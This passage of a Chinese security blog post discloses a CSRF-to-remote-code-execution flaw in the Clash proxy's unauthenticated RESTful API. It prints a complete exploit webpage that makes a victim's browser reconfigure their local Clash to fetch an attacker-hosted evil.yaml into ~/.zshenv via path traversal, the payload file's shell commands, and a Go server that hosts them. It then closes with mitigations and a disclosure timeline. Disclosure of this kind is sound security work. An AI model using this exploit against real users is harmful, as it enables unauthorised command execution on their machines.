> **CORS**
> 
> 为了能使 Clash 更加灵活，RESTful API 支持 CORS 让使用者能从浏览器使用 XHR、fetch 调用。

那么攻击者可以构造一个恶意的网页，当受害者使用浏览器访问时，浏览器将会执行攻击者精心构造的JS代码，此时将是受害者自身的浏览器去请求Clash的RESTful API，从而间接地达到强制重载受害者Clash的配置文件的目的。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Breaking Clash</title>
</head>

<body>
    <h1 align="center">Breaking Clash</h1>
    <p align="center"> <img src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"></p>
    <p>
        <script>        
            const data = {
                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://{{yourevilser}}/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"
            };
            fetch('http://127.0.0.1:9090/configs?force=true', {
                method: 'PUT',
                headers: {
                    'Content-type': 'application/json; charset=utf-8',
                },
                body: JSON.stringify(data),
            }).then(response => response.json())
                .then(data => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.log('Error:', error);
                });
        </script>
</body>
</html>
```

在公网起一个Web服务，同时允许跨域，对外提供如上index.html和evil.yaml恶意文件，evil.yaml文件中包含了攻击者期望执行的命令。注意将如上html中的`{{yourevilser}}`换成你自己的IP或者域名。

```bash
$ cat evil.yaml
open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &' <<!:
  aaaaa: 11111

proxies:
  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}

aaaaa: 2222

$ cat main.go
package main

import (
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	r.Use(cors.Default())
	r.StaticFile("/", "./index.html")
	r.StaticFile("/evil.yaml", "./evil.yaml")
	r.Run(":9999")
}

$ go run main.go
[GIN-debug] GET    /                         --> github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)
[GIN-debug] HEAD   /                         --> github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)
[GIN-debug] GET    /evil.yaml                --> github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)
[GIN-debug] HEAD   /evil.yaml                --> github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)
[GIN-debug] Listening and serving HTTP on :9999
```

限于文章篇幅，针对使用CLI Clash的Linux用户的攻击就不演示了，只做针对macOS用户使用ClashX是如何遭受到攻击的演示。

当macOS用户在日常使用ClashX时，此时打开一条来自攻击者发过来的恶意链接时，浏览器就会自动去请求Clash的RESTful API，如下图所示，使用最新版Firefox和Safari浏览器都成功对本地Clash发出了请求，Firefox和Safari浏览器比较宽松。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/firefox.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/firefox.png)

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/safari.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/safari.png)

而由于Chrome浏览器推出的[Private Network Access](https://developer.chrome.com/blog/private-network-access-update/?utm_source=devtools)安全策略，不允许公网HTTP协议的网站对本地网络进行请求，对于Chrome浏览器协议最好使用HTTPS。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/chrome.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/chrome.png)

所以最终恶意网站统一使用HTTPS协议，这样便可以同时兼容三大浏览器。

浏览器成功对Clash RESTful API发送请求后，之后Clash会自动将evil.yaml下载到受害者本地`~/.zshenv`路径，当受害者打开终端时，就会自动执行此文件中的内容。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/breaking-clash-on-chrome.gif)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/breaking-clash-on-chrome.gif)

[](#0x06-总结 "0x06 总结")0x06 总结
-----------------------------

当Clash开启了RESTful API并且没有做鉴权，此时无论监听的地址是什么，都会存在被攻击的可能。被攻击的方式可能是直接的，也可能是间接的。公网目前还存在大量未加鉴权的Clash，都存在被直接攻击的风险。间接攻击发生在Clash客户端RESTful API侦听的地址为内网/本地地址，此时攻击者无法直接访问受害者的Clash RESTful API。

漏洞根源在于Clash中存在的路径穿越，借助Clash未鉴权的RESTful API，配合CSRF漏洞，攻击者只需很低的攻击成本（**受害者访问一个网页**）就可以达到未授权配置重置下载任意文件至相应路径，最终实现远程命令执行。

防范这种攻击也很简单，对于不会使用到的RESTful API功能，就默认关闭服务，减少暴露面，具体的做法是在配置文件里将`external-controller`那一行注释或者删掉；当然如果需要使用到RESTful API的话，那就做强鉴权，`secret`的值使用一个随机复杂的密码代替，`external-controller`的端口也可以修改成其他不常见端口。修改配置后需要重启软件才能生效。最后，在做好这一切后，还要避免导入不安全的输入，即不要随便导入不受信任的配置文件，因为这是攻击者仅剩的唯一光顾窗口。

一些存在漏洞的本地服务虽然只运行在本地网络环境上，但未必就很安全，有时远程攻击者利用CSRF和钓鱼等组合攻击的方式，通常就能成功达到攻击本地应用的目的。

[](#0x07-时间线 "0x07 时间线")0x07 时间线
--------------------------------

*   2022年6-7月间 发现相关漏洞在野攻击
    
*   2023年4月16日 向Clash官方提交[漏洞修复代码](https://github.com/Dreamacro/clash/pull/2680)
    
*   2023年4月16日 Clash官方发布安全版本[v1.15.1](https://github.com/Dreamacro/clash/releases/tag/v1.15.1)
    
*   2023年5月12日 ClashX官方[更新Clash Core到v1.15.1](https://github.com/yichengchen/clashX/releases/tag/1.115.1)
    
*   2023年5月15日 公开本文漏洞利用细节